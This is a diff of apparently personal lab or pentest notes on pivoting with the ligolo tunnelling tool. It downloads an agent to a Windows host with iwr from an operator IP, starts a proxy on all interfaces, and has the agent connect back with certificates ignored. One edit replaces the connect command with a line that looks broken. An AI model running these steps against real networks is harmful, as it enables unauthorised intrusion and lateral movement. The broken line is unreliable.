@@ -11,7 +11,7 @@ iwr -uri http://10.10.15.236:8088/ligolo-agent.exe -OutFile ligolo-agent.exe
 ```
 
 ```shell
-sudo ip tuntap add user $(whoami) mode tun ligolo sudo ip link set ligolo up
+sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
  
 sudo ./proxy -selfcert -api-laddr 0.0.0.0:8081
@@ -21,7 +21,7 @@ sudo ./proxy -selfcert -api-laddr 0.0.0.0:8081
 
 connect agent
 ```shell
-.\ligolo-agent.exe -connect 10.10.15.236:11601 -ignore-cert
+.\ligolo-agent.exe ss
 ```
 ![](Attachments/Pasted%20image%2020260811123750.png)
 
